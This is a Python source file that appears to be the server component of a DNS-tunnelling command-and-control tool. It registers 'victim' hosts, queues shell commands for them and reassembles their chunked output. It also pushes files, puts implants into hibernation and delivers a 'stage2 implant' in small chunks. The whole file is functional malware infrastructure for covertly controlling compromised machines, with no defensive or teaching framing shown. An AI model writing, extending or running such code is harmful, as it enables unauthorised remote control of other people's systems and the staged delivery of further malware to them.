# command.py
import json
import time
import base64
from os import path
import hashlib

import settings

# parse command from dns request.  For consistency, each value will be counted from the right
# [..., value 3, value 2, value 1]
def parsecommand(cmddata):
    decodedcmd = bytes.fromhex(cmddata[-1]).decode('utf-8')         # decode value 1, c2 option

    options = {
        "int": optInit,
        "end": optEnd,
        "fil": optFile,
        "cnk": optChunk,
        "cmd": optCommand,
        "dis": optDissolve,
        "hib": optHibernate,
        "hsh": optHash,
        "mac": optMacro
    }

    return options[decodedcmd](cmddata)

# initial connection by client, set up record in manage.json and return ID to client
def optInit(cmddata):
    # decode value 3, victim hostname
    try:
        decodedHostname = bytes.fromhex(cmddata[-3]).decode('utf-8')
    except:
        print("bad format. Could not decode hex")
        return


    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        # check to see if this host already has an ID
        found = False
        for record in manage["clients"]:
            if decodedHostname == manage["clients"][record]["hostname"]:
                found = True
                newID = record

        # if this host doesn't have an ID, assign one and save record to manage.json
        if not found:
            while str(manage["id"]) in manage["clients"]:
                manage["id"] += 1
            newID = str(manage["id"])
            manage["clients"][newID] = settings.unknownEntry
            manage["clients"][newID]["hostname"] = decodedHostname
            manage["clients"][newID]["lastactive"] = time.time()
            manage["id"] += 1

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)
    
    print("\n\n!New Connection!\n")
    print("ID: " + newID + "\tHostname: " + decodedHostname)
    print("\n" + manage["currID"] + " > ", end = '')

    return base64.b64encode(newID.encode())

# if client is ready for command and command is prepared, send to client, otherwise "wait"
def optCommand(cmddata):
    # grab value 2, client ID
    clientID = cmddata[-2]

    command = ""

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)
        
        # if client is running and for some reason is not stored in manage.json, add it
        if clientID not in manage["clients"]:
            manage["clients"][clientID] = settings.unknownEntry
            print("\n\n!New Connection!\n")
            print("ID: " + clientID + "\tHostname: " + manage["clients"][clientID]["hostname"])
            print("\n" + str(manage["currID"]) + " > ", end = '')

        # if a command is preped, prepare to send to client
        if manage["clients"][clientID]["command"]:
            command = manage["clients"][clientID]["command"]
            manage["clients"][clientID]["response"] = ""
            manage["clients"][clientID]["command"] = ""
        
        # update timestamp to show status as active
        manage["clients"][clientID]["lastactive"] = time.time()

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)

    if command:
        return base64.b64encode(command.encode())
    return base64.b64encode("wait".encode())

# recieve a chunk of response from the client
def optChunk(cmddata):
    # grab value 2, client ID
    clientID = cmddata[-2]
    # decode value 3, response chunk
    try:
        chunk = bytes.fromhex(cmddata[-3]).decode('utf-8')
    except:
        print("bad format. Could not decode hex")
        return

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        # append chunk to response collection
        manage["clients"][clientID]["response"] += chunk

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)

    return base64.b64encode("ready".encode())

# all response chunks were sent
def optEnd(cmddata):
    # grab value 2, client ID
    clientID = cmddata[-2]

    with open('./manage.json') as f:
        manage = json.load(f)

    print("\n\n" + manage["clients"][clientID]["response"])
    print("\n" + str(manage["currID"]) + " > ", end = '')

    return base64.b64encode("ok".encode())

# The client confirmed that it will stop running, remove index from manage.json
def optDissolve(cmddata):
    clientID = cmddata[-2]                              # grab value 2, client ID

    with settings.lock:
        with open('./manage.json') as f:
            manage = json.load(f)

        del manage["clients"][clientID]
        manage["currID"] = ""

        with open('./manage.json', 'w') as f:
            json.dump(manage, f)
        
    print("\n\nID: " + clientID + " dissolved")
    print("\n" + manage["currID"] + " > ", end = '')
    return base64.b64encode("ok".encode())

# Put the client to sleep for a set period of time (no continues pings for new commands)
def optHibernate(cmddata):
    # grab value 2, client ID
    clientID = cmddata[-2]
    # decode value 3, argument
    try:
        arg1 = bytes.fromhex(cmddata[-3]).decode('utf-8')
    except:
        print("bad format. Could not decode hex")
        return

    with open('./manage.json') as f:
        manage = json.load(f)

    if arg1 == "time":
        return base64.b64encode(manage["clients"][clientID]["args"][0].encode())
            
    if arg1 == "set":
        print("\n\nID: " + clientID + " set to hibernate")
        print("\n" + manage["currID"] + " > ", end = '')
        return base64.b64encode("ok".encode())

    if arg1 == "done":
        print("\n\nID: " + clientID + " awake")
        print("\n" + manage["currID"] + " > ", end = '')
        return base64.b64encode("ok".encode())

# client is ready to receive a file, file name is stored in args[0] and data is stored in args[1]
def optFile(cmddata):
    # grab value 2, client ID
    clientID = cmddata[-2]
    # decode value 3, file arg1 posistion
    try:
        arg1 = bytes.fromhex(cmddata[-3]).decode('utf-8')
    except:
        print("bad format. Could not decode hex")
        return

    with open('./manage.json') as f:
        manage = json.load(f)

    if (arg1 == "name"):
        return base64.b64encode(manage["clients"][clientID]["args"][0].encode())
    if (arg1 == "size"):
        return base64.b64encode(str(len(manage["clients"][clientID]["args"][1])).encode())
    if (arg1 == "done"):
        print("\n\nID: " + clientID + " file transfer complete")
        print("\n" + manage["currID"] + " > ", end = '')
        return base64.b64encode("ok".encode())
    return manage["clients"][clientID]["args"][1][int(arg1):int(arg1) + 0xfc].encode()

# compute hash of file and compare to file transfered to client (currently not used)
def optHash(cmddata):                                                                                              #need to respond when done transfering
    # grab value 2, client ID
    clientID = cmddata[-2]
    # grab value 3, hash of file
    filehash = cmddata[-3]

    with open('./manage.json') as f:
        manage = json.load(f)
    
    hash_object = hashlib.md5(base64.b64decode(manage["clients"][clientID]["args"][0]))

    if filehash == hash_object.hexdigest():
        return base64.b64encode("done".encode())
    return base64.b64encode("bad".encode())

# transfer stage2 implant to client
def optMacro(cmddata):
    # grab value 2, index
    index = cmddata[-2]
    with open('./manage.json') as f:
        manage = json.load(f)
    
    if (index == "s"):
        return str(len(manage["macro"])).encode()

    return manage["macro"][int(index):int(index) + 0xfc].encode()